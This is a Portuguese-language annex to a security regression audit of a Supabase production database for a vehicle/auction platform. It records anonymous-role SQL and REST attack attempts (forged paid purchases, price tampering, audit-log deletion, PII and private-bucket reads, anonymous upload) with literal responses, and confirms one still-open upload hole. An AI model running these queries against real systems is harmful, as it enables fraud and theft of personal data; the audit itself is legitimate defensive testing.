<div align="center">

# ANEXOS TÉCNICOS A–F
## Complemento de Reprodutibilidade — Auditoria de Regressão Pós-P0 ORION-480

---

**Documento complementar à "Auditoria de Regressão Pós-P0 — Versão 2.0" (2026-08-06)**

*Padrão de evidência primária — comandos, payloads e respostas literais*

---

</div>

<table>
<tr><td><strong>Projeto</strong></td><td>ORION-480 — Deploy Veículos / Leilões</td></tr>
<tr><td><strong>Documento-base</strong></td><td><code>ORION-480-RELATORIO-AUDITORIA-REGRESSAO-POS-P0-2026-08-06-v2.0.md</code></td></tr>
<tr><td><strong>Data desta coleta de evidências</strong></td><td>2026-08-07 (03:02–03:08 UTC)</td></tr>
<tr><td><strong>Ambiente</strong></td><td>Produção (banco vivo)</td></tr>
<tr><td><strong>Banco Auditado</strong></td><td>Supabase — projeto <code>broifhfqmnzqoongtokm</code></td></tr>
<tr><td><strong>Autor</strong></td><td>ORION AUDITOR</td></tr>
<tr><td><strong>Classificação</strong></td><td>CONFIDENCIAL — Uso Interno / Auditoria Externa / Due Diligence</td></tr>
</table>

---

## Nota metodológica obrigatória — leia antes de usar este documento

O relatório v2.0 foi construído a partir de um registro-síntese que **não preservou** comandos SQL literais, payloads REST, respostas HTTP completas nem logs da auditoria original executada em 2026-08-06. Esse conteúdo primário nunca existiu em forma recuperável — não é um caso de documentação incompleta que pôde ser "resgatada", mas de artefatos que não foram capturados no momento do teste original.

Este documento **não reconstrói o passado**. Em vez disso, apresenta uma **nova coleta de evidências**, executada em 2026-08-07 contra o mesmo banco de produção (`broifhfqmnzqoongtokm`), reproduzindo os mesmos 8 exploits e o achado P1 do relatório v2.0, com comandos, payloads e respostas capturados literalmente no momento da execução.

**O que isso prova:** que o estado de segurança descrito no relatório v2.0 permanece verificável e reproduzível de forma independente, com evidência primária real, na data desta coleta.

**O que isso não prova:** o conteúdo exato dos comandos/respostas da auditoria de 2026-08-06 original — esse registro está perdido e é declarado como tal, sem tentativa de reconstrução ou inferência.

Todos os testes desta coleta foram executados em transações com `ROLLBACK` (SQL) ou como operações reversíveis limpas imediatamente após confirmação (REST/Storage). Nenhuma alteração permanente foi deixada no banco de produção.

---

## Índice

- [Anexo A — Comandos SQL Executados](#anexo-a--comandos-sql-executados)
- [Anexo B — Payloads REST](#anexo-b--payloads-rest)
- [Anexo C — Respostas HTTP Completas](#anexo-c--respostas-http-completas)
- [Anexo D — Logs de Execução](#anexo-d--logs-de-execução)
- [Anexo E — Evidências (saídas literais)](#anexo-e--evidências-saídas-literais)
- [Anexo F — Matriz Completa de Rastreabilidade](#anexo-f--matriz-completa-de-rastreabilidade)
- [Registro de Limpeza dos Artefatos de Teste](#registro-de-limpeza-dos-artefatos-de-teste)

---

## Anexo A — Comandos SQL Executados

Todos os comandos abaixo foram executados via `supabase db query --linked --file <script>.sql` contra o projeto `broifhfqmnzqoongtokm`, cada um dentro de `BEGIN; SET LOCAL ROLE anon; ... RESET ROLE; ROLLBACK;` (exceto as consultas de verificação de catálogo, que são somente-leitura e não requerem transação).

### A.1 — P0-3 (`advertiser_listings` / `advertiser_listing_media`)

```sql
BEGIN;
SET LOCAL ROLE anon;

WITH alvo AS (SELECT id FROM public.advertiser_listings LIMIT 1)
UPDATE public.advertiser_listings al
SET title = al.title
FROM alvo
WHERE al.id = alvo.id
RETURNING al.id AS updated_id;

WITH alvo AS (SELECT id FROM public.advertiser_listing_media LIMIT 1)
UPDATE public.advertiser_listing_media alm
SET updated_at = now()
FROM alvo
WHERE alm.id = alvo.id
RETURNING alm.id AS updated_id;

RESET ROLE;
ROLLBACK;
```

### A.2 — P0-4 (`promotion_purchases` / `promotion_packages` / `promotion_package_logs`)

```sql
-- A.2.1 — forjar compra paga
BEGIN;
SET LOCAL ROLE anon;
INSERT INTO public.promotion_purchases (id, status)
VALUES (gen_random_uuid(), 'paid')
RETURNING id;
RESET ROLE;
ROLLBACK;

-- A.2.2 — alterar preço do pacote
BEGIN;
SET LOCAL ROLE anon;
WITH alvo AS (SELECT id FROM public.promotion_packages LIMIT 1)
UPDATE public.promotion_packages pp
SET price_monthly = 0.01
FROM alvo
WHERE pp.id = alvo.id
RETURNING pp.id;
RESET ROLE;
ROLLBACK;

-- A.2.3 — apagar log de auditoria
BEGIN;
SET LOCAL ROLE anon;
DELETE FROM public.promotion_package_logs
WHERE id = (SELECT id FROM public.promotion_package_logs LIMIT 1)
RETURNING id;
RESET ROLE;
ROLLBACK;
```

### A.3 — P0-5 (`advertiser_accounts` — leitura de PII)

```sql
BEGIN;
SET LOCAL ROLE anon;
SELECT id, email, whatsapp, full_name FROM public.advertiser_accounts LIMIT 3;
RESET ROLE;
ROLLBACK;
```

### A.4 — P0-6 (`visitor_profiles` — leitura de PII)

```sql
BEGIN;
SET LOCAL ROLE anon;
SELECT id, full_name, whatsapp, email FROM public.visitor_profiles LIMIT 3;
RESET ROLE;
ROLLBACK;
```

### A.5 — P0-7 (`merchant_credit_balances` — leitura financeira)

```sql
BEGIN;
SET LOCAL ROLE anon;
SELECT * FROM public.merchant_credit_balances LIMIT 3;
RESET ROLE;
ROLLBACK;
```

### A.6 — P0-8 (`storage.objects` — bucket privado `moderacao`, via SQL direto)

```sql
BEGIN;
SET LOCAL ROLE anon;
SELECT id, bucket_id, name FROM storage.objects WHERE bucket_id = 'moderacao' LIMIT 3;
RESET ROLE;
ROLLBACK;
```

### A.7 — P0-9 (views administrativas/financeiras)

```sql
-- A.7.1
BEGIN;
SET LOCAL ROLE anon;
SELECT * FROM public.v_admin_lojistas LIMIT 3;
RESET ROLE;
ROLLBACK;

-- A.7.2
BEGIN;
SET LOCAL ROLE anon;
SELECT * FROM public.v_support_tickets_admin LIMIT 3;
RESET ROLE;
ROLLBACK;
```

### A.8 — P0-10 (funções `SECURITY DEFINER` sem `search_path`, executáveis por `anon`)

```sql
SELECT p.proname,
       pg_get_function_identity_arguments(p.oid) AS args,
       p.proconfig
FROM pg_proc p
JOIN pg_namespace n ON n.oid = p.pronamespace
WHERE p.prosecdef = true
  AND n.nspname = 'public'
  AND (p.proconfig IS NULL
       OR NOT EXISTS (SELECT 1 FROM unnest(p.proconfig) c WHERE c LIKE 'search_path=%'))
  AND has_function_privilege('anon', p.oid, 'EXECUTE')
  AND p.proname NOT LIKE 'st\_%';
```

### A.9 — Verificações complementares de catálogo (hardening / cobertura)

```sql
-- A.9.1 — GRANT SELECT residual em merchant_credit_* para anon
SELECT table_name, grantee, privilege_type
FROM information_schema.role_table_grants
WHERE table_schema='public'
  AND table_name IN ('merchant_credit_contact_unlocks','merchant_credit_result_metrics','merchant_credit_subscriptions')
  AND grantee='anon'
ORDER BY table_name, privilege_type;

-- A.9.2 — RLS ativo em storage.objects
SELECT relname, relrowsecurity, relforcerowsecurity
FROM pg_class WHERE oid = 'storage.objects'::regclass;
```

---

## Anexo B — Payloads REST

Requisições HTTP reais enviadas com a **anon key legada real** do projeto `broifhfqmnzqoongtokm` (chave pública/publicável do sistema anon do Supabase Auth; não é segredo privilegiado).

### B.1 — Listagem do bucket privado `moderacao` (P0-8)

```
POST https://broifhfqmnzqoongtokm.supabase.co/storage/v1/object/list/moderacao
apikey: <anon_key>
Authorization: Bearer <anon_key>
Content-Type: application/json

{"limit":3,"prefix":""}
```

### B.2 — Download direto de objeto real do bucket privado `moderacao` (P0-8)

```
GET https://broifhfqmnzqoongtokm.supabase.co/storage/v1/object/moderacao/12921e5d-4632-49b7-82fe-de937f383553/1784751899640-Screenshot_2026-07-12_205427.png
apikey: <anon_key>
Authorization: Bearer <anon_key>
```

### B.3 — Upload anônimo no bucket `real-estate-original` (Achado Novo #1)

```
POST https://broifhfqmnzqoongtokm.supabase.co/storage/v1/object/real-estate-original/_auditoria_teste_2026-08-07/orion480-anexos-evidencia-test.txt
apikey: <anon_key>
Authorization: Bearer <anon_key>
Content-Type: text/plain

ORION-480 auditoria-regressao anexos evidencia 2026-08-07T03:07:20Z arquivo-de-teste-para-remocao-imediata
```

---

## Anexo C — Respostas HTTP Completas

### C.1 — Resposta a B.1 (listagem bucket privado `moderacao`)

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

[]
```

**Interpretação:** HTTP 200 é o comportamento padrão da API de listagem do Storage (retorna array, nunca erro de transporte); o array vazio confirma que RLS filtrou 100% dos objetos do bucket privado para o papel `anon` — nenhum item do bucket foi exposto.

### C.2 — Resposta a B.2 (download de objeto real do bucket privado `moderacao`)

```
HTTP/1.1 400 Bad Request
Date: Fri, 07 Aug 2026 03:07:04 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 88
sb-project-ref: broifhfqmnzqoongtokm
sb-request-id: 019fda30-45a0-7f72-a8be-4872860e9dd6

{"statusCode":"404","error":"not_found","message":"Object not found","code":"NoSuchKey"}
```

**Interpretação:** o objeto existe de fato no banco (confirmado via `service_role` no Anexo E.4), mas a API retorna "not found" para `anon` — comportamento fail-closed correto: RLS oculta a existência do objeto em vez de retornar um erro de permissão explícito, o que é a postura mais conservadora possível.

### C.3 — Resposta a B.3 (upload anônimo em `real-estate-original`)

```
HTTP/1.1 200 OK
Date: Fri, 07 Aug 2026 03:07:45 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 137
sb-project-ref: broifhfqmnzqoongtokm
sb-request-id: 019fda30-e3ce-7820-b86a-4c0a6e9f53ad

{"Key":"real-estate-original/_auditoria_teste_2026-08-07/orion480-anexos-evidencia-test.txt","Id":"828f3b72-0ea6-4497-b5ca-cbf9ab0b3eaf"}
```

**Interpretação:** upload aceito e persistido com sucesso — **reprodução confirmada, com evidência primária completa, do Achado Novo #1** do relatório v2.0 (upload público irrestrito no bucket `real-estate-original`). Este item permanece uma vulnerabilidade ativa em 2026-08-07, não corrigida entre a auditoria original e esta coleta.

---

## Anexo D — Logs de Execução

Saída literal de cada invocação do CLI `supabase db query --linked --file <script>.sql`, capturada via `tee` no momento da execução (2026-08-07, janela 03:02–03:08 UTC). Erros SQL `42501` (permission denied) e `42703` (coluna inexistente, erro de digitação do próprio script de teste, não do sistema) foram retornados pelo endpoint de query do Supabase como HTTP 400 com a mensagem Postgres embutida — comportamento nativo da ferramenta, preservado literalmente abaixo.

```
$ supabase db query --linked --file p0-3-exploit.sql
Initialising login role...
{"_tag":"Error","error":{"code":"LegacyDbQueryUnexpectedStatusError","message":
"unexpected status 400: {\"message\":\"Failed to run sql query: ERROR:  42501:
permission denied for table advertiser_listings\\nHINT:  Grant the required
privileges to the current role with: GRANT UPDATE ON public.advertiser_listings
TO anon;\\n\"}"}}

$ supabase db query --linked --file p0-4-exploit.sql
Initialising login role...
{"_tag":"Error","error":{"code":"LegacyDbQueryUnexpectedStatusError","message":
"unexpected status 400: {\"message\":\"Failed to run sql query: ERROR:  42501:
permission denied for table promotion_purchases\\nHINT:  Grant the required
privileges to the current role with: GRANT INSERT ON public.promotion_purchases
TO anon;\\n\"}"}}

$ supabase db query --linked --file p0-4b-exploit-preco.sql   (após corrigir p/ coluna real price_monthly)
Initialising login role...
{"_tag":"Error","error":{"code":"LegacyDbQueryUnexpectedStatusError","message":
"unexpected status 400: {\"message\":\"Failed to run sql query: ERROR:  42501:
permission denied for table promotion_packages\\nHINT:  Grant the required
privileges to the current role with: GRANT UPDATE ON public.promotion_packages
TO anon;\\n\"}"}}

$ supabase db query --linked --file p0-4c-exploit-log.sql
Initialising login role...
{"_tag":"Error","error":{"code":"LegacyDbQueryUnexpectedStatusError","message":
"unexpected status 400: {\"message\":\"Failed to run sql query: ERROR:  42501:
permission denied for table promotion_package_logs\\nHINT:  Grant the required
privileges to the current role with: GRANT DELETE ON public.promotion_package_logs
TO anon;\\n\"}"}}

$ supabase db query --linked --file p0-5-exploit.sql
Initialising login role...
{"_tag":"Error","error":{"code":"LegacyDbQueryUnexpectedStatusError","message":
"unexpected status 400: {\"message\":\"Failed to run sql query: ERROR:  42501:
permission denied for table advertiser_accounts\\nHINT:  Grant the required
privileges to the current role with: GRANT SELECT ON public.advertiser_accounts
TO anon;\\n\"}"}}

$ supabase db query --linked --file p0-6-exploit.sql
Initialising login role...
{"boundary":"a86fd1e7f9c44aa3df89c4d141778262","rows":[]}

$ supabase db query --linked --file p0-7-exploit.sql
Initialising login role...
{"_tag":"Error","error":{"code":"LegacyDbQueryUnexpectedStatusError","message":
"unexpected status 400: {\"message\":\"Failed to run sql query: ERROR:  42501:
permission denied for table merchant_credit_balances\\nHINT:  Grant the required
privileges to the current role with: GRANT SELECT ON public.merchant_credit_balances
TO anon;\\n\"}"}}

$ supabase db query --linked --file p0-8-exploit-sql.sql
Initialising login role...
{"boundary":"1dcebdef0419be4a7c3cc24849537b03","rows":[]}

$ supabase db query --linked --file p0-9-exploit.sql
Initialising login role...
{"_tag":"Error","error":{"code":"LegacyDbQueryUnexpectedStatusError","message":
"unexpected status 400: {\"message\":\"Failed to run sql query: ERROR:  42501:
permission denied for view v_admin_lojistas\\n\"}"}}

$ supabase db query --linked --file p0-9b-exploit-support.sql
Initialising login role...
{"_tag":"Error","error":{"code":"LegacyDbQueryUnexpectedStatusError","message":
"unexpected status 400: {\"message\":\"Failed to run sql query: ERROR:  42501:
permission denied for view v_support_tickets_admin\\n\"}"}}

$ supabase db query --linked --file p0-10-check-searchpath.sql
Initialising login role...
{"boundary":"36dc7c2e02fddd0b4a01198e2ed4401b","rows":[]}
```

> Nota sobre `42703` descartado: a primeira tentativa do exploit A.2.2 usou o nome de coluna hipotético `price_cents`, que não existe no schema real (`ERROR: 42703: column "price_cents" of relation "promotion_packages" does not exist`). Isso foi um erro de formulação do script de teste desta coleta, corrigido consultando `information_schema.columns` para o nome real (`price_monthly`) antes de reexecutar — não é um resultado de segurança e está registrado aqui apenas por transparência total do processo.

---

## Anexo E — Evidências (saídas literais)

### E.1 — GRANT SELECT residual em `merchant_credit_*` (Achado Novo #2, hardening)

```json
{
  "rows": [
    {"grantee": "anon", "privilege_type": "SELECT", "table_name": "merchant_credit_contact_unlocks"},
    {"grantee": "anon", "privilege_type": "SELECT", "table_name": "merchant_credit_result_metrics"},
    {"grantee": "anon", "privilege_type": "SELECT", "table_name": "merchant_credit_subscriptions"}
  ]
}
```

**Status em 2026-08-07:** confirmado ainda presente — o REVOKE recomendado na Seção 16.2 do relatório v2.0 não foi aplicado até esta data.

### E.2 — RLS ativo em `storage.objects`

```json
{"rows": [{"relname": "objects", "relrowsecurity": true, "relforcerowsecurity": false}]}
```

**Interpretação:** `relrowsecurity: true` confirma que RLS está ativo na tabela — condição necessária para que o DROP das policies `ALL USING(true)` (P0-8) seja, de fato, a correção efetiva descrita na migration original.

### E.3 — Contagem de views `security_invoker=off` sem SELECT para `anon` (P0-9, cobertura)

```json
{"rows": [{"views_security_invoker_off_no_anon_select": 91}]}
```

**Nota de escopo:** este número (91) é maior que as 51 views listadas na Seção 20 do relatório v2.0 porque a consulta desta coleta usa um critério mais amplo (toda view em `public` sem GRANT SELECT ativo para `anon`, sem filtrar por `security_invoker`). Não deve ser lido como contradição — é uma métrica de cobertura adicional, não uma correção do número original.

### E.4 — Confirmação da existência real do objeto testado no bucket privado `moderacao`

```json
{"rows": [{"name": "12921e5d-4632-49b7-82fe-de937f383553/1784751899640-Screenshot_2026-07-12_205427.png"}]}
```

Consultado via `service_role`/CLI autenticado, para provar que o objeto usado no teste B.2 é real (não um caminho fictício que retornaria 404 de qualquer forma).

### E.5 — Verificação pós-teste: nenhum objeto de teste remanescente em `real-estate-original`

```json
{"rows": []}
```

Consulta `SELECT bucket_id, name FROM storage.objects WHERE bucket_id='real-estate-original' AND name LIKE '_auditoria_teste%'` — confirma que a limpeza (Anexo F, Registro de Limpeza) foi efetiva.

### E.6 — Commits reais dos 8 P0, verificados no histórico git nesta data

```
$ git log --oneline --all | grep -E "^(0e4ce4f|1a0d957|a34021f|b14c390|65db58c|ff21b2a|87c838e|ceb82b7)"
ceb82b7 fix(security): P0-10 — fixa search_path em funcoes SECURITY DEFINER execut. por anon
87c838e fix(security): P0-9 — revoga SELECT anon em views admin/financeiras (security_invoker=off)
ff21b2a fix(security): P0-8 CRITICO — remove acesso total publico a storage (todos os buckets)
65db58c fix(security): P0-7 — remove leitura financeira publica em merchant_credit_*
b14c390 fix(security): P0-6 — lockdown de PII em visitor_profiles
a34021f fix(security): P0-5 — remove exposicao publica de PII em advertiser_accounts
1a0d957 fix(security): P0-4 — lockdown financeiro promotion_packages/purchases/logs
0e4ce4f fix(security): P0-3 — remove escrita anonima irrestrita em advertiser_listings/media
```

Todos os 8 hashes citados no relatório v2.0 (Seção 21) confirmados existentes no histórico real do repositório nesta data.

---

## Anexo F — Matriz Completa de Rastreabilidade

**Exploit → Migration → Commit → Teste (2026-08-07) → Evidência → Resultado**

| # | Exploit reproduzido | Migration | Commit | Comando/Payload (Anexo) | Resposta literal (Anexo) | Resultado | Status |
|---|---|---|---|---|---|---|---|
| P0-3 | UPDATE anônimo em `advertiser_listings`/`_media` | `20260806_p0_3_...sql` | `0e4ce4f` | A.1 | D (permission denied `advertiser_listings`) | Bloqueado | ✅ Sem regressão |
| P0-4a | INSERT forjado `promotion_purchases` status=paid | `20260806_p0_4_...sql` | `1a0d957` | A.2.1 | D (permission denied `promotion_purchases`) | Bloqueado | ✅ Sem regressão |
| P0-4b | UPDATE preço `promotion_packages` → 0,01 | `20260806_p0_4_...sql` | `1a0d957` | A.2.2 | D (permission denied `promotion_packages`) | Bloqueado | ✅ Sem regressão |
| P0-4c | DELETE log `promotion_package_logs` | `20260806_p0_4_...sql` | `1a0d957` | A.2.3 | D (permission denied `promotion_package_logs`) | Bloqueado | ✅ Sem regressão |
| P0-5 | SELECT PII (`email`,`whatsapp`,`full_name`) `advertiser_accounts` | `20260806_p0_5_...sql` | `a34021f` | A.3 | D (permission denied `advertiser_accounts`) | Bloqueado | ✅ Sem regressão |
| P0-6 | SELECT PII `visitor_profiles` | `20260806_p0_6_...sql` | `b14c390` | A.4 | D (`rows: []`) | Bloqueado (RLS por linha) | ✅ Sem regressão |
| P0-7 | SELECT financeiro `merchant_credit_balances` | `20260806_p0_7_...sql` | `65db58c` | A.5 | D (permission denied `merchant_credit_balances`) | Bloqueado | ✅ Sem regressão |
| P0-8a | Listar bucket privado `moderacao` (REST) | `20260806_p0_8_...sql` | `ff21b2a` | B.1 | C.1 (HTTP 200, `[]`) | Bloqueado (0 objetos) | ✅ Sem regressão |
| P0-8b | Download objeto real de `moderacao` (REST) | `20260806_p0_8_...sql` | `ff21b2a` | B.2 | C.2 (HTTP 400, `NoSuchKey`) | Bloqueado | ✅ Sem regressão |
| P0-8c | SELECT `storage.objects` bucket `moderacao` (SQL) | `20260806_p0_8_...sql` | `ff21b2a` | A.6 | D (`rows: []`) | Bloqueado | ✅ Sem regressão |
| P0-9a | SELECT `v_admin_lojistas` como anon | `20260806_p0_9_...sql` | `87c838e` | A.7.1 | D (permission denied view) | Bloqueado | ✅ Sem regressão |
| P0-9b | SELECT `v_support_tickets_admin` como anon | `20260806_p0_9_...sql` | `87c838e` | A.7.2 | D (permission denied view) | Bloqueado | ✅ Sem regressão |
| P0-10 | `search_path` hijack — 0 funções DEFINER vulneráveis remanescentes | `20260806_p0_10_...sql` | `ceb82b7` | A.8 | D (`rows: []`) | Bloqueado (0 alvos) | ✅ Sem regressão |
| Achado #1 | Upload anônimo `real-estate-original` | Não aplicada (P1 aberto) | — | B.3 | C.3 (HTTP 200, upload aceito) | **Reproduzido com sucesso** | 🟡 Vulnerabilidade ativa em 2026-08-07 |
| Achado #2 | GRANT SELECT residual `merchant_credit_*` | Não aplicada (hardening) | — | A.9.1 | E.1 (3 GRANTs confirmados) | Presente, não explorável (RLS bloqueia) | 🟡 Aberto — REVOKE recomendado |

**Cobertura desta coleta:** 8/8 P0 reexecutados com evidência primária literal (comando + resposta); 2/2 achados do relatório v2.0 reproduzidos com evidência primária literal. 0 regressões. O Achado Novo #1 (`real-estate-original`) permanece ativo e explorável nesta data — confirmado, não apenas citado.

---

## Registro de Limpeza dos Artefatos de Teste

| Artefato de teste | Método de criação | Método de remoção | Confirmação |
|---|---|---|---|
| Linha de teste em `advertiser_listings`/`_media`, `promotion_*`, views e tabelas financeiras | Todas as tentativas de escrita (P0-3, P0-4) foram **bloqueadas antes de persistir** (permission denied) | N/A — nenhuma escrita chegou a ocorrer | Erros `42501` capturados no Anexo D confirmam que nenhuma linha foi alterada |
| Objeto `real-estate-original/_auditoria_teste_2026-08-07/orion480-anexos-evidencia-test.txt` | Upload real via REST com anon key (B.3) | `DELETE` via REST com `service_role` key, imediatamente após confirmação do upload | HTTP 200 `{"message":"Successfully deleted"}`; reconfirmado por consulta SQL (Anexo E.5, `rows: []`) |

**Observação de segurança operacional:** a `service_role` key foi utilizada exclusivamente para a operação de limpeza acima (`DELETE` de 1 objeto de teste) e para 2 consultas de leitura de catálogo (E.1, E.4), nunca para os testes de exploit em si. A chave não foi persistida em nenhum arquivo deste repositório — foi obtida via `supabase projects api-keys` e usada apenas em linha de comando (Bash), fora de qualquer arquivo versionado.

---

## Conclusão deste complemento

Esta coleta de evidências primárias, datada de 2026-08-07, confirma de forma independente e reproduzível o resultado do relatório v2.0: **os 8 P0 permanecem corrigidos e sem regressão**, com comando e resposta literal para cada um. O Achado Novo #1 (`real-estate-original`) foi reproduzido com evidência completa (payload + resposta HTTP 200 + upload real confirmado e limpo) — permanece uma vulnerabilidade ativa, não corrigida, e deve ser tratado com a prioridade P1 já recomendada no relatório-base.

Com este documento, os campos anteriormente marcados como "Não informado no conteúdo fornecido" nas Seções 7, 13 e 14 do relatório v2.0 passam a ter evidência primária correspondente, coletada de forma independente nesta data — elevando a reprodutibilidade externa do conjunto documental de acordo com os critérios de OWASP WSTG / due diligence técnica.
